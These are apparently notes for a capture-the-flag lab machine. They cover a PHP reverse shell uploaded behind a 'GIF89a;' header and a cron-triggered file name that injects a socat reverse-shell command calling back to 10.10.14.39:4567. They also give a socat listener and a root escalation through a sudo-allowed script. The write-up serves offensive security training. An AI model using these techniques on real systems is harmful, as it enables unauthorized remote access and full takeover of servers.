  Will show a few interesting places

 With the .php extension selected, will most likely show where some possible places for exploit will be.

Need a php reverse shell > look at links for Reverse shells for reference
After you have the reverse shell add 'GIF89a;' header to the top since the website needs a image file, so you are tricking the website.

http://10.10.10.146/upload.php -to uplaod file
http://10.10.10.146/photos.php/10_10_14_39.php.jpg -to access it. file gets renamed with ip address based on website settings.
After successful reverse php shell is made few things you need to look at. Need to look at uplaods in /html and you will see what happens to files in the system. 
After the system has a file it takes time for the cron to do it. Once the cron runs the file you get the reverse shell. Also note
there are parsers that are in place so nothing can go into the file... maybe in the name

  Kali:
  socat file:`tty`,raw,echo=0 TCP-L:4567
 Network: > /var/www/html/uploads
 touch ";socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:4567"

Socat is used since nothing else seemed to be installed that would allow a reverse-shell from a file name and 
did not have any '/' in the text
After socat reverse shell is run you get a shell '@guly'

 Once as Guly: 
 Run pspy64 and linenum on the system to notice what happens when changename.sh is run as well as other system events
 https://seclists.org/fulldisclosure/2019/Apr/24 ( very helpful )

 'sudo -l' to check if sudo is allowed.
 you can run changename.sh 

 sudo changename.sh > Name= root /bin/sh  >> none for all the rest and then you have root

 now as root> cd /root >> cat root.txt
 you now have the system!
